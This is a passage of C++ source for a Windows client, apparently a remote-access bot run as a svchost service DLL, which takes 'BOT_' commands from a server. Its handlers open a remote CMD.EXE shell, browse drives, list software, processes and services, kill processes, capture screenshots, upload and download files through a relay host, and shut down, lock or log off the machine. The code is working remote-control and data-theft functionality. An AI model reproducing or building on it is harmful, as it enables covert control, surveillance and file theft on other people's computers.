		return FALSE;
	}
	
	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		bRet = TRUE;
		delete[] (LPBYTE)pResStorage;
	}
	
	SAFE_DELETE(pReqStorage);
	return bRet;
}

BOOL CSafeProcess::GetRelayFileInfo(RelayFileInfo &Info)
{
	BinStorage::InitKey(theInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;

	// Update Status
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_GET_FILE_UPDOWN_INFO);
	if (FALSE == bRet)
		return FALSE;

	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		DWORD dwItemCount = BinStorage::GetItemCount(pResStorage);
		const DWORD dwItemGroup = 3;
		do 
		{
			if (0 != (dwItemCount % dwItemGroup))
			{
				break;
			}

			BinStorage::ITEM *pItem = NULL;
			int iIndex = 0;
			while((pItem = BinStorage::GetNextItem(pResStorage, pItem)) != NULL)
			{
				LPTSTR pText = BinStorage::GetItemText(pItem);

				if (0 == iIndex)
					Info.bFileTrans = _ttoi(pText);
				else if (1 == iIndex)
					lstrcpy(Info.szUpalodScript, pText);
				else if (2 == iIndex)
					lstrcpy(Info.szUpalodDir, pText);
				SAFE_DELETE_AR(pText);
				iIndex++;
			}
			if (dwItemGroup == iIndex)
			{
				bRet = TRUE;
			}
		}
		while(FALSE);
		delete[] (LPBYTE)pResStorage;
	}

	SAFE_DELETE(pReqStorage);
	return bRet;
}

BOOL CSafeProcess::GetClientId(DWORD &dwClientId)
{
	BinStorage::InitKey(theInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;
	
	// Update Status
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_GET_CLIENT_ID);
	DWORD dwSerialLen;
	LPSTR pSerial = CConv::CharToUtf(m_strDeviceSerial, &dwSerialLen);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_DEVICE_SERIAL, 0, pSerial, dwSerialLen);
	delete[] pSerial;
	if (FALSE == bRet)
		return FALSE;
	
	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		LPTSTR pItem = BinStorage::GetItemData(pResStorage);
		if (NULL != pItem && 0 != lstrlen(pItem))
		{
			dwClientId = _ttoi(pItem);
			if (0 != dwClientId)
				bRet = TRUE;
		}
		delete[] (LPBYTE)pResStorage;
		SAFE_DELETE_AR(pItem);
	}
	
	SAFE_DELETE(pReqStorage);
	return bRet;
}

LONG CSafeProcess::Dir(LPCTSTR pszSrc, tstring& strDir)
{
	strDir = _T("");
	if(lstrcmp(pszSrc, _T("*")) == 0)
	{
		strDir += _T("0");

		//
		// Drive
		//
		TCHAR szDrive[32];
		for(int i = 0; i < 26; i++)
		{
			wsprintf(szDrive, _T("%c:\\"), i + 'A');
			if(GetDriveType(szDrive) != DRIVE_NO_ROOT_DIR)
			{
				strDir += szDrive;
			}
		}
	}
	else
	{
		strDir += _T("1");
		//
		// Directory
		//
		tstring szPath = pszSrc;
		if(szPath.at(szPath.length() - 1) != _T('\\'))
		{
			szPath += _T("\\");
		}
		tstring		szFilter = szPath + _T("*.*");
		BOOL		bFound = TRUE;
		
		WIN32_FIND_DATA FindData;
		HANDLE hContext = FindFirstFile(szFilter.c_str(), &FindData);
		if(hContext == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}
		
		int iPos = 0;
		while(bFound)
		{
			tstring str = FindData.cFileName;
			if(str != _T(".") && str != _T(".."))
			{
				BOOL bDirectory = FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
				TCHAR szBuf[MAX_PATH + 100];
				wsprintf(szBuf, _T("%02X%08X%08X%08X%08X\"%s|"), 
					bDirectory, FindData.nFileSizeLow, FindData.nFileSizeHigh,
					FindData.ftCreationTime.dwLowDateTime, FindData.ftCreationTime.dwHighDateTime, str.c_str());
				strDir += szBuf;
			}
			bFound = FindNextFile(hContext, &FindData);
		}
		::FindClose(hContext);
	}
	return RESPONSE_RET_SUCCESS;
}

void CSafeProcess::OnGetCommand(LPCTSTR lpszBuffer)
{
	OutputLog(lpszBuffer);
//	m_CmdLock.Lock();
//	m_CmdOuput += lpszBuffer;
//	Request Req;
//	Req.dwEventId = 0;
	SendResponseAsync(BOT_TYPE_CMD, lpszBuffer);
//	m_CmdLock.Unlock();
}

LONG CSafeProcess::Cmd(LPCTSTR pszSrc, tstring& strCmd)
{
	//
	TCHAR szCmdPath[MAX_PATH] = {0};
	GetSystemDirectory(szCmdPath, MAX_PATH);
	lstrcat(szCmdPath, _T("\\CMD.EXE"));

	//
//	m_CmdLock.Lock();
//	m_CmdOuput = _T("");
//	m_CmdLock.Unlock();
	if(lstrcmp(pszSrc, _T("*")) == 0)
	{
		m_pRedCmd->Close();
		m_pRedCmd->Create(szCmdPath);
	}
	else if(lstrcmp(pszSrc, _T("#")) == 0)
	{
		m_pRedCmd->Close();
	}
	else 
	{
		m_pRedCmd->WriteCommand(pszSrc, STDIO_WRITE);
	}

	/*
	Sleep(1000 * 1);
	m_CmdLock.Lock();
	strCmd = m_CmdOuput;
	if (strCmd == _T(""))
		strCmd = _T("*");
	m_CmdOuput = _T("");
	m_CmdLock.Unlock();
	*/

	return RESPONSE_RET_SUCCESS;
}

LONG CSafeProcess::GetVersionList(tstring& strVersion)
{
	TCHAR szBuffer[1024] = {0};
	HKEY hRootKey;
	LONG lRet;
	// Windows
	if((lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, 
		KEY_READ, &hRootKey)) == ERROR_SUCCESS) 
	{
		lstrcat(szBuffer, _T("Windows\""));
		TCHAR szTemp[128] = {0};
		ULONG dwSize = 128;
		DWORD dwType = REG_SZ;
		RegQueryValueEx(hRootKey, _T("ProductName"), 0, &dwType, LPBYTE(szTemp), &dwSize);
		lstrcat(szBuffer, szTemp);
		lstrcat(szBuffer, _T(" "));
		dwType = REG_SZ;
		RegQueryValueEx(hRootKey, _T("CSDVersion"), 0, &dwType, LPBYTE(szTemp), &dwSize);
		lstrcat(szBuffer, szTemp);
		lstrcat(szBuffer, _T(" "));
		dwType = REG_SZ;
		RegQueryValueEx(hRootKey, _T("CurrentBuildNumber"), 0, &dwType, LPBYTE(szTemp), &dwSize);
		lstrcat(szBuffer, _T("(Build "));
		lstrcat(szBuffer, szTemp);
		lstrcat(szBuffer, _T(")|"));
		strVersion += szBuffer;
		//
		RegCloseKey(hRootKey);
	}
	else
	{
		OutputLog(_T("Version: Open Windows Key Failed: %d\n"), lRet);
	}

	//
	LPCTSTR lpSubKey = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
	if ((lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ, &hRootKey)) == ERROR_SUCCESS)
	{
		int iIndex = 0;
		TCHAR szName[512] = {0};
		DWORD dwNameLen = 512;
		while(RegEnumKeyEx(hRootKey, iIndex++, szName, &dwNameLen, 0, NULL, NULL, 0) != ERROR_NO_MORE_ITEMS) 
		{
			TCHAR szEnumKey[512] = {0};
			lstrcpy(szEnumKey, lpSubKey);
			lstrcat(szEnumKey, _T("\\"));
			lstrcat(szEnumKey, szName);
			HKEY hSubKey;
			if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, szEnumKey, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) 
			{
				DWORD dwNameType = REG_SZ; 
				DWORD dwNameVersion = REG_SZ; 
				TCHAR szDisplayName[512] = {0};
				DWORD dwDisplayName = 512;
				TCHAR szVersion[512] = {0};
				DWORD dwVersion = 512;
				RegQueryValueEx(hSubKey, _T("DisplayName"), 0, &dwNameType, LPBYTE(szDisplayName), &dwDisplayName);
				RegQueryValueEx(hSubKey, _T("DisplayVersion"), 0, &dwNameVersion, LPBYTE(szVersion), &dwVersion);
				if (dwNameType == REG_SZ && dwNameVersion == REG_SZ &&
					(lstrlen(szDisplayName) != 0 && lstrlen(szVersion) != 0))
				{
					strVersion += szDisplayName;
					strVersion += _T("\"");
					strVersion += szVersion;
					strVersion += _T("|");
				}
				RegCloseKey(hSubKey);
			}
			//
			memset(szName, 0, sizeof(szName));
			dwNameLen = 512;
		}
		RegCloseKey(hRootKey);
	}
	else
	{
		OutputLog(_T("Version: Open Uninstall Key Failed: %d\n"), lRet);
	}
	return RESPONSE_RET_SUCCESS;
}

BOOL CSafeProcess::DownloadFileTest()
{
	return TRUE;
	/*
	HttpQuery::QueryInfo query_info;
	LPCTSTR lpszMethod = _T("GET");
	LPCTSTR pFile = _T("/safe/data/1.avi");
	LPCTSTR pLocalFile = _T("C:\\1.avi");

	BOOL bRet = HttpQuery::QuerfUrl(
		theInfo.szHost, theInfo.uPort, pFile, pLocalFile,
		query_info, NULL, NULL, lpszMethod, NULL, 0);
	if (TRUE == bRet)
	{
	}
	return bRet;
	*/
}

DWORD WINAPI CSafeProcess::_ThreadFile( LPVOID lpThreadParameter )
{
	_DownloadArg *pArg = (_DownloadArg*)lpThreadParameter;
//	Sleep(1000);
	pArg->pProcess->ThreadFile(pArg->strRelay, pArg->strFilePath, pArg->bToRemote);
	delete pArg;
	return 0;
}

CString CSafeProcess::GenResponse(CString strLog, BOOL bRet, std::map<CString, CString> mapPair)
{
	LPSTR pLog = CConv::CharToUtf(strLog);
	Json::Value jsonItem;
	jsonItem["log"] = pLog;
	jsonItem["status"] = bRet;
	for (std::map<CString, CString>::iterator pIter = mapPair.begin(); pIter != mapPair.end(); pIter++)
	{
		LPSTR pKey = CConv::CharToUtf(pIter->first);
		LPSTR pValue = CConv::CharToUtf(pIter->second);
		jsonItem[pKey] = pValue;
		delete[] pKey;
		delete[] pValue;
	}
	Json::FastWriter writer;
	std::string strJson = writer.write(jsonItem);
	LPTSTR pBuf = CConv::UtfToChar(strJson.c_str());
	CString strResponse = pBuf;
	delete[] pLog;
	delete[] pBuf;
	return strResponse;
}

CString CSafeProcess::GenResponse(CString strLog, BOOL bRet)
{
	std::map<CString, CString> mapPair;
	return GenResponse(strLog, bRet, mapPair);
}

VOID CSafeProcess::ThreadFile(const tstring &strRelay, const tstring &strFilePath,
	BOOL bToRemote)
{
	USES_CONVERSION;
	HttpQuery::QueryInfo Info;
	BOOL bRet = FALSE;
	CString strResponse;
	DWORD dwType;
	if (TRUE == bToRemote)
	{
		if (m_RelayInfo.bFileTrans)
		{
			bRet = HttpQuery::DownLoadFile(
				A2T(theInfo.szHost), theInfo.uPort,
				(m_RelayInfo.szUpalodDir + strRelay).c_str(), strFilePath.c_str(),
				Info);
		}
		
		CString strLog;
		strLog.Format(_T("从中转端(%s)下载到远端(%s) => %s"), strRelay.c_str(), strFilePath.c_str(), bRet == TRUE ? _T("成功") : _T("失败"));
		std::map<CString, CString> mapPair;

		mapPair.insert(std::map<CString, CString>::value_type(_T("NEW_VERSION"), _T("1")));
		mapPair.insert(std::map<CString, CString>::value_type(_T("RELAY"), strRelay.c_str()));
		mapPair.insert(std::map<CString, CString>::value_type(_T("PATH"), strFilePath.c_str()));
		
		if (bRet)
		{
			mapPair.insert(std::map<CString, CString>::value_type(_T("REFRESH"), _T("1")));
		}
		strResponse = GenResponse(strLog, bRet ? 0 : 1, mapPair);
		dwType = BOT_TYPE_FILE_TO_REMOTE;
	}
	else
	{
		if (m_RelayInfo.bFileTrans)
		{
			bRet = HttpQuery::PostFile(
				A2T(theInfo.szHost), theInfo.uPort,
				m_RelayInfo.szUpalodScript,
				strFilePath.c_str(), strRelay.c_str()
				);
		}

		CString strLog;
		strLog.Format(_T("从远端(%s)上传到中转端(%s) => %s"), strFilePath.c_str(), strRelay.c_str(), bRet == TRUE ? _T("成功") : _T("失败"));
		//TCHAR szBuf[MAX_PATH];
		//wsprintf(szBuf, _T("从远端(%s)上传到中转端(%s) => 开始"), pRemotePath, strRelay);
		//strLog.Format(_T("%s&%s&从远端(%s)到中转端(%s) => %s"),
		//	strFilePath.c_str(), strRelay.c_str(),
		//	strFilePath.c_str(), strRelay.c_str(),
		//	bRet == TRUE ? _T("成功") : _T("失败"));
		std::map<CString, CString> mapPair;
		mapPair.insert(std::map<CString, CString>::value_type(_T("PATH"), strFilePath.c_str()));
		mapPair.insert(std::map<CString, CString>::value_type(_T("FILE_ID"), strRelay.c_str()));

		strResponse = GenResponse(strLog, bRet ? 0 : 1, mapPair);
		dwType = BOT_TYPE_FILE_FROM_REMOTE;
	}
	
	SendResponseAsync(dwType, strResponse);
}

LONG CSafeProcess::DoRequest(Request& Req, tstring& strResponse)
{
	/*
	TCHAR szResponse[128] = {0};
	wsprintf(szResponse, _T("Response Test: %s"), Req.szRequest);
	strResponse = szResponse;
	*/

	strResponse = _T("");
	LONG lRet = RESPONSE_RET_IMPLEMENT;
	if (BOT_TYPE_DIR == Req.dwType)
	{
		lRet = Dir(Req.szRequest, strResponse);
	}
	else if (BOT_TYPE_CMD == Req.dwType)
	{
		lRet = Cmd(Req.szRequest, strResponse);
	}
	else if (BOT_TYPE_VERSION == Req.dwType)
	{
		lRet = GetVersionList(strResponse);
		if (strResponse == _T(""))
			strResponse = _T("*");
	}
	else if (BOT_TYPE_FILE_TO_REMOTE == Req.dwType)
	{
		OutputLog(_T("%s\n"), Req.szRequest);
		tstring strInfo = Req.szRequest;
		LPSTR pBuf = CConv::CharToUtf(strInfo.c_str());
		Json::Reader reader;
		Json::Value root;
		if (!reader.parse(pBuf, root, false))
		{
			strResponse = GenResponse(_T("从中转端下载到远端 => 通信失败"), 1);
			lRet = RESPONSE_RET_FAILED;
		}
		else
		{
			DWORD dwFileId = GetJsonInt(root, "FILE_ID", 0);
			std::string strRemotePathA = GET_JSON_STRING(root, "REMOTE_PATH", "");
			LPTSTR pRemotePath = CConv::UtfToChar(strRemotePathA.c_str());
			CString strRemotePath = pRemotePath;
			delete[] pRemotePath;
	
			if (-1 != strRemotePath.Find(_T('*')))
			{
				TCHAR szLockExePath[MAX_PATH] = {0};
#ifndef TEST_MODE
				CSvchostServiceModule::GetDllPath(szLockExePath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
#else
				GetModuleFileName(NULL, szLockExePath, MAX_PATH);
#endif
				*_tcsrchr(szLockExePath, _T('\\')) = 0;
				lstrcat(szLockExePath, _T("\\"));
				strRemotePath.Replace(_T("*"), szLockExePath);
			}
			
			/*
			strRemotePath.Replace(_T("%%"), _T("%"));

			DWORD dwSize = ExpandEnvironmentStrings(strRemotePath, NULL, 0);
			LPTSTR pszBuffer = new TCHAR[dwSize];
			ExpandEnvironmentStrings(strRemotePath, pszBuffer, dwSize);
			strRemotePath = pszBuffer;
			delete[] pszBuffer;
			*/

			CString strRelay;
			strRelay.Format(_T("%d"), dwFileId);
			
			TCHAR szBuf[MAX_PATH];
			wsprintf(szBuf, _T("从中转端(%s)下载到远端(%s) => 开始"), strRelay, strRemotePath);
			strResponse = GenResponse(szBuf, 0);
			lRet = RESPONSE_RET_SUCCESS;

			_DownloadArg *pArg = new _DownloadArg;
			pArg->pProcess = this;
			pArg->strFilePath = strRemotePath;
			pArg->strRelay = strRelay;
			pArg->bToRemote = TRUE;
			DWORD dwThreadId;
			CreateThread(NULL, 0, _ThreadFile, pArg, 0, &dwThreadId);
		}
		delete[] pBuf;
	}
	else if (BOT_TYPE_FILE_FROM_REMOTE == Req.dwType)
	{
		OutputLog(_T("%s\n"), Req.szRequest);
		tstring strInfo = Req.szRequest;
		LPSTR pBuf = CConv::CharToUtf(strInfo.c_str());
		Json::Reader reader;
		Json::Value root;
		if (!reader.parse(pBuf, root, false))
		{
			strResponse = GenResponse(_T("从远端上传到中转端 => 通信失败"), 1);
			lRet = RESPONSE_RET_FAILED;
		}
		else
		{
			DWORD dwFileId = GetJsonInt(root, "FILE_ID", 0);
			std::string strRemotePathA = GET_JSON_STRING(root, "REMOTE_PATH", "");
			LPTSTR pRemotePath = CConv::UtfToChar(strRemotePathA.c_str());
			CString strRelay;
			strRelay.Format(_T("%d"), dwFileId);

			TCHAR szBuf[MAX_PATH];
			wsprintf(szBuf, _T("从远端(%s)上传到中转端(%s) => 开始"), pRemotePath, strRelay);
			strResponse = GenResponse(szBuf, 0);
			lRet = RESPONSE_RET_SUCCESS;

			_DownloadArg *pArg = new _DownloadArg;
			pArg->pProcess = this;
			pArg->strFilePath = pRemotePath;
			pArg->strRelay = strRelay;
			pArg->bToRemote = FALSE;
			DWORD dwThreadId;
			CreateThread(NULL, 0, _ThreadFile, pArg, 0, &dwThreadId);
			delete[] pRemotePath;
		}
		delete[] pBuf;
	}
	else if (BOT_TYPE_SCREEN == Req.dwType)
	{
		//Common::CreateNormalProcessInSystem(_T("C:\\Users\\xltyt\\Desktop\\Screen\\Debug\\screen.exe"));
		//Common::CreateNormalProcessInSystem(_T("rundll32.exe C:\\Users\\xltyt\\Desktop\\Screen\\Debug\\screen.exe"));

		//TCHAR szDllPath[MAX_PATH];
		//CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
		//wsprintf(lpFilePath, _T("rundll32.exe %s,CaptureScreen"));
		//strResponse = _T("Capture Screen Failed");
		//lRet = RESPONSE_RET_FAILED;
		
		COleDateTime date = COleDateTime::GetCurrentTime();
		CString strDay;
		strDay.Format(_T("%04d%02d%02d_%02d%02d%02d"), date.GetYear(), date.GetMonth(), date.GetDay(), date.GetHour(), date.GetMinute(), date.GetSecond());
		TCHAR szTempPath[MAX_PATH] = {0};
		GetTempPath(MAX_PATH, szTempPath);
		TCHAR szFileName[MAX_PATH] = {0};
		wsprintf(szFileName, _T("%s.%d.Screen.bmp"), strDay, theInfo.dwId);
		TCHAR szFilePath[MAX_PATH] = {0};
		wsprintf(szFilePath, _T("%s%s"), szTempPath, szFileName);
		//lRet = CaptureScreen(szFilePath);
		TCHAR szDllPath[MAX_PATH] = {0};
#ifdef TEST_MODE
		GetModuleFileName(NULL, szDllPath, MAX_PATH);
		*_tcsrchr(szDllPath, _T('\\')) = 0;
		lstrcat(szDllPath, _T("\\"));
		lstrcat(szDllPath, SERVICE_DLL_FILE_NAME);
#else
		CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
#endif
		DeleteFile(szFilePath);
		TCHAR szCmd[512];
		wsprintf(szCmd, _T("rundll32.exe \"%s\",CaptureScreen %s"), szDllPath, szFilePath);
		//MessageBox(NULL, szCmd, NULL, MB_ICONERROR);
		OutputLog(szCmd);
#ifdef TEST_MODE
		SystemUtils::CreateNormalProcess(szCmd, TRUE, TRUE);
#else
		SystemUtils::CreateNormalProcessInSystem(szCmd, TRUE, TRUE, TRUE);
#endif
		lRet = PathFileExists(szFilePath);
		if (lRet)
		{
			strResponse = _T("截屏成功，开始传输...");
			lRet = RESPONSE_RET_SUCCESS;

			_DownloadArg *pArg = new _DownloadArg;
			pArg->pProcess = this;
			pArg->strFilePath = szFilePath;
			pArg->strRelay = szFileName;
			pArg->bToRemote = FALSE;
			DWORD dwThreadId;
			CreateThread(NULL, 0, _ThreadFile, pArg, 0, &dwThreadId);
		}
		else
		{
			strResponse = _T("截屏失败!");
			lRet = RESPONSE_RET_FAILED;
		}
	}
	else if (BOT_TYPE_PROCESS == Req.dwType)
	{
		std::vector<Utils::PROCESS_ITEM> vecItems;
		BOOL bRet = Utils::Process(vecItems);
		if (bRet)
		{
			lRet = RESPONSE_RET_SUCCESS;
			for (int i = 0; i < (int)vecItems.size(); i++)
			{
				CString strTmp;
				strTmp.Format(_T("%s\"%d|"), vecItems[i].strName, vecItems[i].dwProcessId);
				strResponse += strTmp;
			}
		}
		else
		{
			lRet = RESPONSE_RET_FAILED;
		}
	}
	else if (BOT_TYPE_KILL_PROCESS == Req.dwType)
	{
		INT iPid = _tstoi(Req.szRequest);
		HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, iPid);
		if (hProc != 0)
		{
			BOOL bRet = TerminateProcess(hProc, -1);
			if (bRet)
			{
				strResponse = _T("关闭进程成功");
				lRet = RESPONSE_RET_SUCCESS;
			}
			else
			{
				strResponse = _T("关闭进程失败");
				lRet = RESPONSE_RET_FAILED;
			}
		}
		else
		{
			strResponse = _T("打开进程失败");
			lRet = RESPONSE_RET_FAILED;
		}
	}
	else if (BOT_TYPE_SERVICE == Req.dwType)
	{
		std::vector<Utils::SERIVCE_ITEM> vecService;
		BOOL bRet = Utils::Service(vecService);
		if (bRet)
		{
			lRet = RESPONSE_RET_SUCCESS;
			for (int i = 0; i < (int)vecService.size(); i++)
			{
				strResponse += vecService[i].strServiceName;
				strResponse += _T("\"");
				strResponse += vecService[i].strDisplayName;
				strResponse += _T("|");
			}
		}
		else
		{
			lRet = RESPONSE_RET_FAILED;
		}
	}
	else if (BOT_TYPE_SHUTDOWN == Req.dwType)
	{
		if (SystemUtils::SystemShutdown(SystemUtils::SYSTEM_OP_TYPE_SHUTDOWN))
		{
			strResponse = _T("关机成功");
		}
		else
		{
			strResponse = _T("关机失败");
		}
		lRet = RESPONSE_RET_SUCCESS;
	}
	else if (BOT_TYPE_RESTART == Req.dwType)
	{
		if (SystemUtils::SystemShutdown(SystemUtils::SYSTEM_OP_TYPE_RESTART))
		{
			strResponse = _T("重启成功");
		}
		else
		{
			strResponse = _T("重启失败");
		}
		lRet = RESPONSE_RET_SUCCESS;
	}
	else if (BOT_TYPE_LOGOFF == Req.dwType)
	{
		/*
		if (Common::SystemShutdown(Common::SYSTEM_OP_TYPE_LOGOFF))
			strResponse = _T("注销成功");
		else
			strResponse = _T("注销失败");
		*/
		/*
		DWORD dwType = 3;
		BOOL bLock = m_ipcLock.Write((LPBYTE)&dwType, sizeof(DWORD));
		OutputLog(_T("Logoff: [%d]"), bLock);
		if (bLock)
			strResponse = _T("注销成功");
		else
			strResponse = _T("注销失败");
		lRet = RESPONSE_RET_SUCCESS;
		*/

		Json::Value jsonItem;
		jsonItem["Type"]	= PIPE_TYPE_LOGOFF;
		jsonItem["Content"]	= "";
		Json::FastWriter writer;
		std::string strPipeContent = writer.write(jsonItem);
		PipeClient client;
		NamedPipe *pPipe = client.Connect(PIPE_NAME);
		if (NULL != pPipe)
		{
			pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
			NamedPipe::Push(pPipe);
			strResponse = _T("注销成功");
			lRet = RESPONSE_RET_SUCCESS;
		}
		else
		{
			strResponse = _T("注销失败!(PIPE失败)");
			lRet = RESPONSE_RET_FAILED;
		}
	}
	else if (BOT_TYPE_LOCK == Req.dwType)
	{
		/*
		TCHAR szDllPath[MAX_PATH];
		CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
		TCHAR szCmd[512];
		wsprintf(szCmd, _T("rundll32.exe \"%s\",LockScreen"), szDllPath);
		BOOL bLock = Common::CreateNormalProcessInSystem(szCmd);
		*/
		/*
		DWORD dwType = 1;
		BOOL bLock = m_ipcLock.Write((LPBYTE)&dwType, sizeof(DWORD));
		OutputLog(_T("Lock: [%d]"), bLock);
		if (bLock)
			strResponse = _T("锁屏成功");
		else
			strResponse = _T("锁屏失败");
		lRet = RESPONSE_RET_SUCCESS;
		*/
		Json::Value jsonItem;
		jsonItem["Type"]	= PIPE_TYPE_LOCK;
		jsonItem["Content"]	= "";
		Json::FastWriter writer;
		std::string strPipeContent = writer.write(jsonItem);
		PipeClient client;
		NamedPipe *pPipe = client.Connect(PIPE_NAME);
		if (NULL != pPipe)
		{
			pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
			NamedPipe::Push(pPipe);
			strResponse = _T("锁屏成功");
			lRet = RESPONSE_RET_SUCCESS;

			m_bLocked = TRUE;
			m_bLockModeAuto = FALSE;
		}
		else
		{
			strResponse = _T("锁屏失败!(PIPE失败)");
			lRet = RESPONSE_RET_FAILED;
		}
	}
	else if (BOT_TYPE_UNLOCK == Req.dwType)
	{
		/*
		TCHAR szDllPath[MAX_PATH];
		CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
		TCHAR szCmd[512];
		wsprintf(szCmd, _T("rundll32.exe \"%s\",UnLockScreen"), szDllPath);
		BOOL bLock = Common::CreateNormalProcessInSystem(szCmd);
		*/
		/*
		DWORD dwType = 2;
		BOOL bLock = m_ipcLock.Write((LPBYTE)&dwType, sizeof(DWORD));
		OutputLog(_T("Lock: [%d]"), bLock);
		if (bLock)
			strResponse = _T("解锁成功");
		else
			strResponse = _T("解锁失败");
		lRet = RESPONSE_RET_SUCCESS;
		*/
		Json::Value jsonItem;
		jsonItem["Type"]	= PIPE_TYPE_UNLOCK;
		jsonItem["Content"]	= "";
		Json::FastWriter writer;
		std::string strPipeContent = writer.write(jsonItem);
		PipeClient client;
		NamedPipe *pPipe = client.Connect(PIPE_NAME);
		if (NULL != pPipe)
		{
			pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
			NamedPipe::Push(pPipe);
			strResponse = _T("解锁成功");
			lRet = RESPONSE_RET_SUCCESS;

			m_bLocked = FALSE;
			m_bLockModeAuto = FALSE;
		}
		else
		{
			strResponse = _T("解锁失败!(PIPE失败)");
			lRet = RESPONSE_RET_FAILED;
		}
	}
	else if (BOT_TYPE_SET_LOCK_AUTO == Req.dwType)
	{
		/*
		TCHAR szDllPath[MAX_PATH];
		CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
		TCHAR szCmd[512];
		wsprintf(szCmd, _T("rundll32.exe \"%s\",UnLockScreen"), szDllPath);
		OutputLog(szCmd);
		Common::CreateNormalProcessInSystem(szCmd);
		*/
		/*
		strResponse = _T("设置自动模式成功");
		lRet = RESPONSE_RET_SUCCESS;
		DWORD dwType = 2;
		BOOL bWrite = m_ipcLock.Write((LPBYTE)&dwType, sizeof(DWORD));
		OutputLog(_T("Lock: [%d]"), bWrite);
		*/
		Json::Value jsonItem;
		jsonItem["Type"]	= PIPE_TYPE_UNLOCK;
		jsonItem["Content"]	= "";
		Json::FastWriter writer;
		std::string strPipeContent = writer.write(jsonItem);
		PipeClient client;
		NamedPipe *pPipe = client.Connect(PIPE_NAME);
		if (NULL != pPipe)
		{
			pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
			NamedPipe::Push(pPipe);
			strResponse = _T("设置自动模式成功");
			lRet = RESPONSE_RET_SUCCESS;
		}
		else
		{
			strResponse = _T("设置自动模式失败!(PIPE失败)");
			lRet = RESPONSE_RET_FAILED;
		}

		m_bLocked = FALSE;
		m_bLockModeAuto = TRUE;
	}
	else if (BOT_TYPE_UPDATE_CLIENT_LOCK_INFO == Req.dwType)
	{
		USES_CONVERSION;
#if 0
		LPSTR pRequest = T2A((LPTSTR)(LPCTSTR)Req.szRequest);
		SIZE_T dwBufSize = 0;
		LPBYTE pBuf = Crypt::_base64Decode(pRequest, strlen(pRequest), &dwBufSize);
		OutputLog(_T("---LEN: %d, %d"), dwBufSize, sizeof(_CLIENT_INFO));
		if (dwBufSize == sizeof(_CLIENT_INFO))
		{
			_CLIENT_INFO *pInfo = (_CLIENT_INFO *)pBuf;
			EnterCriticalSection(&m_LockerInfoLock);
			memcpy(m_LockerInfo, pInfo, sizeof(_CLIENT_INFO));

			/*
			TCHAR szDllPath[MAX_PATH];
			CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
			TCHAR szCmd[512];
			wsprintf(szCmd, _T("rundll32.exe \"%s\",UnLockScreen"), szDllPath);
			OutputLog(szCmd);
			Common::CreateNormalProcessInSystem(szCmd);
			//m_bLocked = FALSE;
			*/

			BOOL bWrite = m_ipcInfo.Write((LPBYTE)m_LockerInfo, sizeof(_CLIENT_INFO));
			OutputLog(_T("Write: [%d], %d"), bWrite, m_LockerInfo->iWinCount);
			/*
			TCHAR szDllPath[MAX_PATH];
			CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
			TCHAR szCmd[512];
			wsprintf(szCmd, _T("rundll32.exe \"%s\",UpdateInfo"), szDllPath);
			OutputLog(szCmd);
			Common::CreateNormalProcessInSystem(szCmd);
			*/

			LeaveCriticalSection(&m_LockerInfoLock);
			strResponse = _T("更新授权成功");
			lRet = RESPONSE_RET_SUCCESS;
		}
		else
		{
			strResponse = _T("更新授权失败!");
			lRet = RESPONSE_RET_FAILED;
		}
		free(pBuf);
#else
		std::string strRequest = CT2A((LPTSTR)(LPCTSTR)Req.szRequest);
		BOOL bParsed = m_LockerInfo->LoadConfig(strRequest.c_str());
		if (bParsed)
		{
			Json::Value jsonItem;
			jsonItem["Type"]	= PIPE_TYPE_INFO;
			jsonItem["Content"]	= strRequest;
			Json::FastWriter writer;
			std::string strPipeContent = writer.write(jsonItem);
			PipeClient client;
			NamedPipe *pPipe = client.Connect(PIPE_NAME);
			if (NULL != pPipe)
			{
				pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
				NamedPipe::Push(pPipe);
				strResponse = _T("更新授权成功");
				lRet = RESPONSE_RET_SUCCESS;
			}
			else
			{
				strResponse = _T("更新授权失败!(PIPE失败)");
				lRet = RESPONSE_RET_FAILED;
			}
		}
		else
		{
			strResponse = _T("更新授权失败!");
			lRet = RESPONSE_RET_FAILED;
		}
#endif
	}
	else if (BOT_TYPE_NETWORK == Req.dwType)
	{
		strResponse = _T("*");
		int i;
		int iIndex = 0;
		// TCP
		int iTcpCount = 0;
